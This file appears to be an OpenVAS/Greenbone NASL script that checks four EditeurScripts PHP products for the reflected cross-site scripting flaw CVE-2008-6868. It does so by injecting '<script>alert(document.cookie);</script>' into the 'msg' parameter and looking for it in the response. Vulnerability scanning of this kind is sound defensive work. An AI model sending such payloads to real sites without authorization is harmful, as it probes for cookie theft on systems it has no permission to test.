if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100049" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2008-6868" );
	script_bugtraq_id( 34112 );
	script_name( "Multiple EditeurScripts Products 'msg' Parameter Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34112/discuss" );
	script_tag( name: "summary", value: "Multiple EditeurScripts products are prone to a cross-site scripting
  vulnerability because they fail to sufficiently sanitize
  user-supplied data." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the
  affected site. This may allow the attacker to steal cookie-based
  authentication credentials and to launch other attacks." );
	script_tag( name: "affected", value: "The following products and versions are affected:

  - EScontacts v1.0

  - EsBaseAdmin v2.1

  - EsPartenaires v1.0

  - EsNews v1.2

  Other versions may also be affected." );
	script_tag( name: "qod", value: "50" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
dir = make_list( "/EsContacts",
	 "/EsBaseAdmin/default",
	 "/EsPartenaires",
	 "/EsNews/admin/news" );
x = 0;
for d in dir {
	site = "/login.php";
	if(d == "/EsNews/admin/news"){
		site = "/modifier.php";
	}
	url = NASLString( d, site, "?msg=<script>alert(document.cookie);</script>" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(buf == NULL){
		continue;
	}
	if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && egrep( pattern: "<script>alert\\(document\\.cookie\\);</script>", string: buf )){
		es_soft = eregmatch( string: d, pattern: "/([a-zA-Z]+)/*.*" );
		if(!isnull( es_soft[1] )){
			vuln_essoft_found[x] = es_soft[1];
		}
	}
	x++;
}
if(vuln_essoft_found){
	info = NASLString( "The following vulnerable EditeurScripts products were detected on the remote host:\\n\\n" );
	for found in vuln_essoft_found {
		if(!isnull( found )){
			vuln = TRUE;
			info += NASLString( "  ", found, "\\n" );
		}
	}
	if(vuln){
		security_message( port: port, data: info );
		exit( 0 );
	}
}
exit( 99 );

